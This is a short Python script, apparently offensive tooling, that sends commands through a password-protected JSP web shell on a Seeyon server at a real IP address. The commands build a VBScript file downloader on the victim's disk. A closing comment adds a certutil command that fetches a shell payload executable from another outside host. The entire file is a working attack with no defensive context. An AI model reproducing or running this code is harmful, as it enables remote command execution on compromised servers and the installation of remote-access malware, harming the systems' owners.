#!/usr/bin/env python
# -*- encoding: utf-8 -*-

"""
@author: d00ms(--)
@file: Download.py
@time: 2019-7-3 14:49
@desc:
"""

import requests
from urllib.parse import urlencode

if __name__ == "__main__":
    prim = []
    prim.append('echo iLocal=LCase(WScript.Arguments(1))>c:%5c"Program Files"%5cdownload.vbs')
    prim.append('echo iRemote=LCase(WScript.Arguments(0))>>c:%5c"Program Files"%5cdownload.vbs')
    prim.append('echo Set xPost=CreateObject("Microsoft.XMLHTTP")>>c:%5c"Program Files"%5cdownload.vbs')
    prim.append('echo xPost.Open "GET",iRemote,0>>c:%5c"Program Files"%5cdownload.vbs')
    prim.append('echo xPost.Send()>>c:%5c"Program Files"%5cdownload.vbs')
    prim.append('echo Set sGet=CreateObject("ADODB.Stream")>>c:%5c"Program Files"%5cdownload.vbs')
    prim.append('echo sGet.Mode=3>>c:%5c"Program Files"%5cdownload.vbs')
    prim.append('echo sGet.Type=1>>c:%5c"Program Files"%5cdownload.vbs')
    prim.append('echo sGet.Open()>>c:%5c"Program Files"%5cdownload.vbs')
    prim.append('echo sGet.Write(xPost.responseBody)>>c:%5c"Program Files"%5cdownload.vbs')
    prim.append('echo sGet.SaveToFile iLocal,2>>c:%5c"Program Files"%5cdownload.vbs')

    proxy ={'http':'127.0.0.1:8080'}
    base_url1 = "http://211.149.185.78:81/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd+/c+"
    base_url2 = "http://www.abc.org/cmd="

    for item in prim:
        code = item.replace(' ','+')
        reply = requests.get(base_url1+code, proxies= proxy)
        print(code,'------><------', reply.status_code)


#
#   some other useful cmdlines:
#       certutil+-urlcache+-split+-f+"http://118.25.88.94/Payload_5555_shell.exe"+"d:%5cabc.exe"
